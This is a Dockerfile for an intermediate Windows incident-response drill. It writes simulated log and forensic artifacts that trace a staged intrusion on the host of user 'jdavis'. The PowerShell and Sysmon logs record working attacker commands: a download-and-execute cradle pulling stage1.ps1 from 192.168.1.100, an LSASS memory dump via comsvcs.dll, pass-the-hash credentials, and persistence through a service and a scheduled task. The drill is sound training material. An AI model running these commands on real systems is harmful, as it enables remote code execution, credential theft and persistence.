FROM mcr.microsoft.com/powershell:lts-ubuntu-22.04

LABEL maintainer="digital4security"
LABEL description="Intermediate Drill 01 - Windows Incident Response (simulated evidence)"

RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    jq \
    python3 \
    && rm -rf /var/lib/apt/lists/*

# Create evidence directory structure
RUN mkdir -p /drill/logs \
             /drill/artifacts/prefetch \
             /drill/artifacts/registry \
             /drill/scripts

# ── Security Event Log (JSON) ─────────────────────────────────────────────────
# Simulated Windows Security events covering the attack timeline:
# 14:22 — jdavis opens malicious Office doc (parent: WINWORD.EXE → cmd.exe)
# 14:24 — PowerShell download cradle executes
# 14:30 — comsvcs.dll MiniDump targets lsass.exe
# 14:32 — Defender fires (simulated as annotation)
# 14:38 — Lateral movement: svc_backup Type 3 logon to FS-CORP-01
# 14:41 — New service installed: "WinUpdateSvc"
# 14:43 — Scheduled task created: "MicrosoftEdgeUpdater"
RUN cat > /drill/logs/Security.evtx.json << 'EOF'
[
  {"EventID":4688,"TimeCreated":"2024-01-15T14:22:11Z","SubjectUserName":"jdavis","SubjectDomainName":"MERIDIAN","NewProcessName":"C:\\Windows\\System32\\cmd.exe","ParentProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"cmd.exe /c powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAdABhAGcAZQAxAC4AcABzADEAJwApAA=="},
  {"EventID":4688,"TimeCreated":"2024-01-15T14:22:13Z","SubjectUserName":"jdavis","SubjectDomainName":"MERIDIAN","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentProcessName":"C:\\Windows\\System32\\cmd.exe","CommandLine":"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAdABhAGcAZQAxAC4AcABzADEAJwApAA=="},
  {"EventID":4688,"TimeCreated":"2024-01-15T14:30:04Z","SubjectUserName":"jdavis","SubjectDomainName":"MERIDIAN","NewProcessName":"C:\\Windows\\System32\\rundll32.exe","ParentProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\Users\\jdavis\\AppData\\Local\\Temp\\svc.dmp full"},
  {"EventID":4624,"TimeCreated":"2024-01-15T14:38:22Z","TargetUserName":"svc_backup","TargetDomainName":"MERIDIAN","LogonType":3,"IpAddress":"10.10.20.15","IpPort":49201,"AuthenticationPackage":"NTLM","LogonProcessName":"NtLmSsp","WorkstationName":"WKS-FINANCE-07"},
  {"EventID":4648,"TimeCreated":"2024-01-15T14:38:19Z","SubjectUserName":"jdavis","SubjectDomainName":"MERIDIAN","TargetUserName":"svc_backup","TargetDomainName":"MERIDIAN","TargetServerName":"FS-CORP-01","ProcessName":"C:\\Windows\\System32\\net.exe","IpAddress":"10.10.10.50"},
  {"EventID":7045,"TimeCreated":"2024-01-15T14:41:05Z","ServiceName":"WinUpdateSvc","ImagePath":"C:\\Windows\\Temp\\svchost32.exe -k netsvcs","ServiceType":"Own Process","StartType":"Auto Start","AccountName":"LocalSystem"},
  {"EventID":4698,"TimeCreated":"2024-01-15T14:43:17Z","SubjectUserName":"jdavis","SubjectDomainName":"MERIDIAN","TaskName":"\\Microsoft\\Windows\\MicrosoftEdgeUpdater","TaskContent":"<Task><Actions><Exec><Command>C:\\Users\\jdavis\\AppData\\Roaming\\svchost.exe</Command></Exec></Actions><Triggers><BootTrigger/></Triggers></Task>"},
  {"EventID":1102,"TimeCreated":"2024-01-15T14:45:00Z","SubjectUserName":"jdavis","SubjectDomainName":"MERIDIAN","SubjectLogonId":"0x3e7"}
]
EOF

# ── Sysmon Event Log (JSON) ───────────────────────────────────────────────────
RUN cat > /drill/logs/Sysmon.evtx.json << 'EOF'
[
  {"EventID":1,"TimeCreated":"2024-01-15T14:22:11Z","Image":"C:\\Windows\\System32\\cmd.exe","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"cmd.exe /c powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAdABhAGcAZQAxAC4AcABzADEAJwApAA==","Hashes":"MD5=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6","User":"MERIDIAN\\jdavis"},
  {"EventID":3,"TimeCreated":"2024-01-15T14:22:14Z","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","DestinationIp":"192.168.1.100","DestinationPort":80,"DestinationHostname":"","Protocol":"tcp","User":"MERIDIAN\\jdavis"},
  {"EventID":11,"TimeCreated":"2024-01-15T14:22:18Z","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetFilename":"C:\\Users\\jdavis\\AppData\\Local\\Temp\\stage1.ps1","User":"MERIDIAN\\jdavis"},
  {"EventID":1,"TimeCreated":"2024-01-15T14:30:04Z","Image":"C:\\Windows\\System32\\rundll32.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\Users\\jdavis\\AppData\\Local\\Temp\\svc.dmp full","Hashes":"MD5=5B4C3D2E1F0A9B8C7D6E5F4A3B2C1D0E","User":"MERIDIAN\\jdavis"},
  {"EventID":10,"TimeCreated":"2024-01-15T14:30:05Z","SourceImage":"C:\\Windows\\System32\\rundll32.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x1FFFFF","CallTrace":"C:\\Windows\\System32\\ntdll.dll+0x1234|C:\\Windows\\System32\\KERNELBASE.dll+0x5678|UNKNOWN(0000000000000000)","SourceUser":"MERIDIAN\\jdavis"},
  {"EventID":11,"TimeCreated":"2024-01-15T14:30:06Z","Image":"C:\\Windows\\System32\\rundll32.exe","TargetFilename":"C:\\Users\\jdavis\\AppData\\Local\\Temp\\svc.dmp","User":"MERIDIAN\\jdavis"},
  {"EventID":3,"TimeCreated":"2024-01-15T14:38:20Z","Image":"C:\\Windows\\System32\\net.exe","DestinationIp":"10.10.10.50","DestinationPort":445,"Protocol":"tcp","User":"MERIDIAN\\jdavis"},
  {"EventID":11,"TimeCreated":"2024-01-15T14:41:00Z","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetFilename":"C:\\Windows\\Temp\\svchost32.exe","User":"MERIDIAN\\jdavis"},
  {"EventID":11,"TimeCreated":"2024-01-15T14:43:10Z","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetFilename":"C:\\Users\\jdavis\\AppData\\Roaming\\svchost.exe","User":"MERIDIAN\\jdavis"}
]
EOF

# ── PowerShell Script Block Log (JSON) ───────────────────────────────────────
RUN cat > /drill/logs/PowerShell.evtx.json << 'EOF'
[
  {"EventID":4104,"TimeCreated":"2024-01-15T14:22:13Z","ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stage1.ps1')","Path":"","ScriptBlockId":"a1b2c3d4-e5f6-7890-abcd-ef1234567890"},
  {"EventID":4104,"TimeCreated":"2024-01-15T14:22:18Z","ScriptBlockText":"# Stage 1 loader\n$b64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUu'\n[System.IO.File]::WriteAllBytes('C:\\Users\\jdavis\\AppData\\Local\\Temp\\beacon.bin', [Convert]::FromBase64String($b64))\nStart-Process 'C:\\Users\\jdavis\\AppData\\Local\\Temp\\beacon.bin'","Path":"C:\\Users\\jdavis\\AppData\\Local\\Temp\\stage1.ps1","ScriptBlockId":"b2c3d4e5-f6a7-8901-bcde-f12345678901"},
  {"EventID":4104,"TimeCreated":"2024-01-15T14:30:02Z","ScriptBlockText":"# Dump LSASS using comsvcs.dll (LOLBin)\n$lsassPid = (Get-Process lsass).Id\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump $lsassPid C:\\Users\\jdavis\\AppData\\Local\\Temp\\svc.dmp full","Path":"","ScriptBlockId":"c3d4e5f6-a7b8-9012-cdef-123456789012"},
  {"EventID":4104,"TimeCreated":"2024-01-15T14:37:45Z","ScriptBlockText":"# Extract credentials from dump (simulated — actual creds in dump file)\n# svc_backup : NTLMhash = aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n# Use pass-the-hash to connect to file server\n$cred = New-Object System.Net.NetworkCredential('svc_backup','P@ssw0rd123','MERIDIAN')\n$share = '\\\\FS-CORP-01\\backup$'\nnet use $share /user:MERIDIAN\\svc_backup * 2>&1","Path":"","ScriptBlockId":"d4e5f6a7-b8c9-0123-defa-234567890123"},
  {"EventID":4104,"TimeCreated":"2024-01-15T14:41:00Z","ScriptBlockText":"# Install persistence: service\n$svcBin = 'C:\\Windows\\Temp\\svchost32.exe'\n[System.IO.File]::WriteAllBytes($svcBin, (New-Object Net.WebClient).DownloadData('http://192.168.1.100/payload.exe'))\nNew-Service -Name 'WinUpdateSvc' -BinaryPathName \"$svcBin -k netsvcs\" -StartupType Automatic\nStart-Service WinUpdateSvc","Path":"","ScriptBlockId":"e5f6a7b8-c9d0-1234-efab-345678901234"},
  {"EventID":4104,"TimeCreated":"2024-01-15T14:43:00Z","ScriptBlockText":"# Install persistence: scheduled task\n$action = New-ScheduledTaskAction -Execute 'C:\\Users\\jdavis\\AppData\\Roaming\\svchost.exe'\n$trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -TaskName 'MicrosoftEdgeUpdater' -TaskPath '\\Microsoft\\Windows\\' -Action $action -Trigger $trigger -Force","Path":"","ScriptBlockId":"f6a7b8c9-d0e1-2345-fabc-456789012345"}
]
EOF

# ── Registry artifacts ────────────────────────────────────────────────────────
RUN cat > /drill/artifacts/registry/run_keys.json << 'EOF'
[
  {"Hive":"HKCU","Key":"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run","ValueName":"WindowsDefenderUpdate","ValueData":"C:\\Users\\jdavis\\AppData\\Roaming\\svchost.exe","LastModified":"2024-01-15T14:44:02Z","User":"jdavis"},
  {"Hive":"HKLM","Key":"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run","ValueName":"WindowsUpdate","ValueData":"C:\\Windows\\Temp\\svchost32.exe","LastModified":"2024-01-15T14:41:07Z","User":"SYSTEM"}
]
EOF

# ── Prefetch artifacts ────────────────────────────────────────────────────────
RUN cat > /drill/artifacts/prefetch/prefetch_list.json << 'EOF'
[
  {"FileName":"RUNDLL32.EXE-B4C1E2D3.pf","LastRun":"2024-01-15T14:30:04Z","RunCount":3,"FilesLoaded":["C:\\Windows\\System32\\comsvcs.dll","C:\\Windows\\System32\\ntdll.dll"]},
  {"FileName":"NET.EXE-7A8B9C0D.pf","LastRun":"2024-01-15T14:38:19Z","RunCount":1,"FilesLoaded":["C:\\Windows\\System32\\net.exe"]},
  {"FileName":"SVCHOST32.EXE-D1E2F3A4.pf","LastRun":"2024-01-15T14:41:10Z","RunCount":1,"FilesLoaded":["C:\\Windows\\Temp\\svchost32.exe"]},
  {"FileName":"WINWORD.EXE-E5F6A7B8.pf","LastRun":"2024-01-15T14:21:55Z","RunCount":47,"FilesLoaded":["C:\\Users\\jdavis\\Documents\\Q4_Financial_Report_FINAL.docm"]}
]
EOF

# ── Network snapshot ─────────────────────────────────────────────────────────
RUN cat > /drill/artifacts/netstat.txt << 'EOF'
Proto  Local Address          Foreign Address        State       PID    Process
TCP    10.10.20.15:49150      192.168.1.100:80       ESTABLISHED 4812   powershell.exe
TCP    10.10.20.15:49201      10.10.10.50:445        ESTABLISHED 4812   powershell.exe
TCP    10.10.20.15:49210      192.168.1.100:4443     ESTABLISHED 5120   svchost32.exe
TCP    0.0.0.0:135            0.0.0.0:0              LISTENING   876    svchost.exe
TCP    0.0.0.0:445            0.0.0.0:0              LISTENING   4      System
EOF

# ── Process snapshot ─────────────────────────────────────────────────────────
RUN cat > /drill/artifacts/processes.txt << 'EOF'
PID    PPID   User              Image
4      0      SYSTEM            System
624    4      SYSTEM            lsass.exe
876    676    NETWORK SERVICE   svchost.exe
1024   676    SYSTEM            services.exe
2248   1024   jdavis            explorer.exe
3812   2248   jdavis            WINWORD.EXE     [C:\Users\jdavis\Documents\Q4_Financial_Report_FINAL.docm]
4572   3812   jdavis            cmd.exe
4812   4572   jdavis            powershell.exe  [-nop -w hidden -enc ...]
5120   1024   SYSTEM            svchost32.exe   [C:\Windows\Temp\svchost32.exe -k netsvcs]
EOF

# ── MFT Timeline (simulated) ─────────────────────────────────────────────────
RUN cat > /drill/artifacts/mft_timeline.csv << 'EOF'
Timestamp,Action,FileName,Size,User
2024-01-15T14:21:55Z,OPEN,C:\Users\jdavis\Documents\Q4_Financial_Report_FINAL.docm,2457600,jdavis
2024-01-15T14:22:18Z,CREATE,C:\Users\jdavis\AppData\Local\Temp\stage1.ps1,1843,jdavis
2024-01-15T14:22:19Z,CREATE,C:\Users\jdavis\AppData\Local\Temp\beacon.bin,73728,jdavis
2024-01-15T14:30:06Z,CREATE,C:\Users\jdavis\AppData\Local\Temp\svc.dmp,41943040,jdavis
2024-01-15T14:38:15Z,ACCESS,\\FS-CORP-01\backup$\db_backup_20240114.bak,0,svc_backup
2024-01-15T14:38:16Z,ACCESS,\\FS-CORP-01\backup$\credentials.kdbx,0,svc_backup
2024-01-15T14:40:58Z,CREATE,C:\Windows\Temp\svchost32.exe,212992,jdavis
2024-01-15T14:43:10Z,CREATE,C:\Users\jdavis\AppData\Roaming\svchost.exe,212992,jdavis
2024-01-15T14:44:02Z,MODIFY,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,0,jdavis
EOF

COPY scripts/ /drill/scripts/

CMD ["pwsh"]
